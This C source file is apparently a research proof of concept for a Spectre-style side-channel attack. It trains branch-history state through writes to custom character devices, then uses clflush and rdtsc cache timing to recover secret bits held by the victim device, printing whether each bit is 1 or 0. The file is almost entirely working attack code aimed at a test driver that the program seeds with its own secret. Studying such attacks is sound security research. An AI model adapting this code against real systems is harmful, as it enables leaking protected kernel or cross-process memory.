#include "Attacker_rsa.h"
#include "Victim.h"
#include <x86intrin.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

unsigned char attacker_array[BYTE_MAX*Cache_Line];
int randa[BYTE_MAX];
unsigned long long difference[BYTE_MAX];
int len_array[BYTE_MAX*Cache_Line];
int times[BYTE_MAX];
char mark[BYTE_MAX];

#define flush(ptr) \
    asm volatile( \
        "clflush (%0)\n"\
        : \
        : "c" (ptr) \
    )

#define min(x, y) (x) < (y) ? (x) : (y)

int PHR_Flush(int fd, int shift) {
    int i=0;
    volatile int temp = 3;
    asm volatile("mfence");
    
    temp+=read(fd, "not affect res", 15);
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    asm volatile("mfence");

    // for(i = 0; i < shift; i++) i += (i+1)/(i+1)-1;
    i = -1;
    do {
        i += (i+1)/(i+1);
    } while(i < shift);
    if (i < len_array[i*Cache_Line])
        temp += attacker_array[i * Cache_Line];

    return temp;
}

int main(int argc, char* argv[]) {
	
    unsigned long long start, end;
    unsigned char temp;
    
    char buf[30];
    int gened[BYTE_MAX];
    unsigned long long secret;
    volatile int tmp = 0;
    for (int i = 0; i < BYTE_MAX; i++) gened[i] = 0;
    int fd0 = open("/dev/mychardev-0", O_RDWR), fd1 = open("/dev/mychardev-1", O_RDWR);
    int reverse, offset;
    if (argc >= 2)
        secret = atoi(argv[1]);
    else secret = 23193659;
    if (argc >= 3)
        offset = atoi(argv[2]);
    else offset = 0;
    srand(time(NULL));
    // printf("secret is %d\n", secret);
    if (secret == 0) { // randomly generate secret and set
        int idx=0;
        secret = (1ULL * (rand() & 1) << 63) | (1ULL * rand() << 32) | (1ULL * (rand() & 1) << 31) | (1ULL * rand());
        printf("%llx\n", secret);
        while (secret > 0) {
            buf[idx++] = secret & 0xff;
            // printf("%d ", buf[idx-1]);
            secret >>= 8;
        }
        write(fd1, buf, idx);
    }
    // return 0;
    // puts("-----------------split line-----------------");
    unsigned long long tstart = _rdtsc(), tend;
    for(int i = 0; i < BYTE_MAX; i++) {
        int r = rand() % BYTE_MAX;
        while(gened[r])
            r = rand() % BYTE_MAX;
        gened[r] = 1;
        randa[i] = r;
    }


    for(int i = 0; i < BYTE_MAX; i++) {
        attacker_array[i*Cache_Line] = randa[i];
        difference[i] = 99999;
        len_array[i*Cache_Line] = PHR_LEN+10;
    }
    int first = 0; // fisrt round get secret == 1 or == 0
    clock_t startck = clock();
for(int atk = 0; atk < 2; atk++) {
    int shift = PHR_LEN-1-offset;
    shift -= (atk+1)*5;
    for (int k = 0; k < 1000; k++) {
        char train_buf[30];
        // len_array[shift*Cache_Line] = shift;
        len_array[shift*Cache_Line] = PHR_LEN+10;
        // train 1
        train_buf[7] = 0x80;
        if (atk == 1 && first == 1) train_buf[7] = 0xc0;
        else if (atk == 1 && first == 0) train_buf[7] = 0x40;
        train_buf[6] = 0x00;
        train_buf[5] = 0x00;
        train_buf[4] = 0x80;
        train_buf[3] = 0x00;
        train_buf[2] = 0x00;
        train_buf[1] = 0x00;
        train_buf[0] = 0x00;
        write(fd0, train_buf, 8);
        for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
            // printf("1\n");
            tmp+=PHR_Flush(fd0, shift);
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
            asm volatile("mfence");
        }
        // train 0
        len_array[shift*Cache_Line] = shift;
        // len_array[shift*Cache_Line] = PHR_LEN+10;
        // train_buf[2] = 0b10110000;
        train_buf[7] = 0x00;
        if (atk == 1 && first == 1) train_buf[7] = 0x40;
        else if (atk == 1 && first == 0) train_buf[7] = 0x00;
        train_buf[6] = 0x00;
        train_buf[5] = 0x00;
        train_buf[4] = 0x80;
        train_buf[3] = 0x00;
        train_buf[2] = 0x00;
        train_buf[1] = 0x00;
        train_buf[0] = 0x00;
        write(fd0, train_buf, 8);
        for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
            // printf("1\n");

            tmp+=PHR_Flush(fd0, shift);
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
            asm volatile("mfence");
        }

        // len_array[shift*Cache_Line] = shift;
        // len_array[shift*Cache_Line] = PHR_LEN+10;
        // attacker retrieve
        flush(attacker_array+shift*Cache_Line); flush(len_array+shift*Cache_Line);
        flush(attacker_array+(shift+1)*Cache_Line); flush(len_array+(shift+1)*Cache_Line);

        tmp+=PHR_Flush(fd1, shift);
        // tmp+=attacker_array[255*Cache_Line];
        unsigned int tsc_aux;

            asm volatile("mfence");
            start = __rdtsc();
            temp = *(unsigned char*)(attacker_array+shift*Cache_Line);
            end = __rdtscp(&tsc_aux);
            asm volatile("lfence");
            // asm volatile("mfence");

            difference[shift] = end-start;
            // printf("%llu ", end-start);
            times[shift] += (end-start) <= HIT_THRESHOLD;
            // difference[randa[i]] = min(end-start, difference[randa[i]]);
            // printf("Spectre Attacking ...\n\n");
        
        // puts("");
    }
    // printf("tmp: %d temp: %d\n", tmp, temp);
    // for(int i = 0; i < PHR_LEN+1; i++) {
    unsigned int tsc_aux;

    tend=__rdtscp(&tsc_aux);
        // printf("confidence of attacker_array[%d]: %d\n", shift, times[shift]);
        mark[shift] = times[shift] >= TIMES_THRESHOLD;
    // }
    // puts("");
    int s = 0, e = PHR_LEN;
    int MAX_OUTPUT_LINES=6;
    int out_times = 0;
    // for(int i = s; i < e-offset; i++)
        if(mark[shift]) {
            printf("confidence [%d] hit at: %d, means secret equals 1\n", times[shift], shift);
            first = 1;
        } 
        else 
        {
            puts("means secret equals 0");
            first = 0;
        }
    //printf("%llu\n", tend-tstart);
}
    close(fd0);
    close(fd1);
 
    // puts("");
}
